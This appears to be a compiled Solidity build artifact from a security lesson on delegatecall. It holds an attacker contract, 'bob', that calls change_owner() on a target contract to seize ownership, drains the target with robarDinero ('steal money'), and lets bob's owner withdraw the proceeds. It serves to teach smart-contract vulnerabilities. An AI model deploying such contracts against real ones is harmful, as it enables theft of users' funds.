{
  "contractName": "bob",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_alice",
          "type": "address"
        }
      ],
      "name": "DarmePrivilegio",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_alice",
          "type": "address"
        }
      ],
      "name": "robarDinero",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506105e2806100606000396000f3fe6080604052600436106100435760003560e01c8063147ac7751461004f5780632ac8fa55146100785780633ccfd60b146100a15780638da5cb5b146100b85761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610076600480360381019061007191906103e4565b6100e3565b005b34801561008457600080fd5b5061009f600480360381019061009a91906103e4565b61021d565b005b3480156100ad57600080fd5b506100b6610286565b005b3480156100c457600080fd5b506100cd61035d565b6040516100da9190610420565b60405180910390f35b60008173ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527ff7026f6f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161018c91906104ac565b6000604051808303816000865af19150503d80600081146101c9576040519150601f19603f3d011682016040523d82523d6000602084013e6101ce565b606091505b505090506001151581151514610219576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161021090610520565b60405180910390fd5b5050565b60008190508073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026a57600080fd5b505af115801561027e573d6000803e3d6000fd5b505050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610314576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161030b9061058c565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561035a573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103b182610386565b9050919050565b6103c1816103a6565b81146103cc57600080fd5b50565b6000813590506103de816103b8565b92915050565b6000602082840312156103fa576103f9610381565b5b6000610408848285016103cf565b91505092915050565b61041a816103a6565b82525050565b60006020820190506104356000830184610411565b92915050565b600081519050919050565b600081905092915050565b60005b8381101561046f578082015181840152602081019050610454565b60008484015250505050565b60006104868261043b565b6104908185610446565b93506104a0818560208601610451565b80840191505092915050565b60006104b8828461047b565b915081905092915050565b600082825260208201905092915050565b7f656c2063616c6c206e6f2066756e63696f6e6f00000000000000000000000000600082015250565b600061050a6013836104c3565b9150610515826104d4565b602082019050919050565b60006020820190508181036000830152610539816104fd565b9050919050565b7f6e6f206572657320656c206f776e657200000000000000000000000000000000600082015250565b60006105766010836104c3565b915061058182610540565b602082019050919050565b600060208201905081810360008301526105a581610569565b905091905056fea264697066735822122098ef5b419d88f96dab2698ca6f9f9856a760510d458f1d776815327aa489124264736f6c63430008110033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier:MIT\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\ninterface alice {\r\n    function withdraw() external;\r\n}\r\n\r\n\r\ncontract bob{\r\n    \r\n    address public owner;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender==owner,\"no eres el owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        owner=msg.sender;\r\n    }    \r\n\r\n    function DarmePrivilegio(address _alice) external{\r\n        (bool success, ) = _alice.call( abi.encodeWithSignature(\"change_owner()\") );\r\n        require(success==true, \"el call no funciono\");\r\n    }\r\n\r\n    function robarDinero(address _alice) external{\r\n        alice contrato= alice(_alice);\r\n        contrato.withdraw();\r\n    }\r\n\r\n    function withdraw() external onlyOwner {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n}",
  "sourcePath": "/home/cryptocris/edIT/security/delegateCall/contracts/bob.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-01-02T02:54:06.452Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}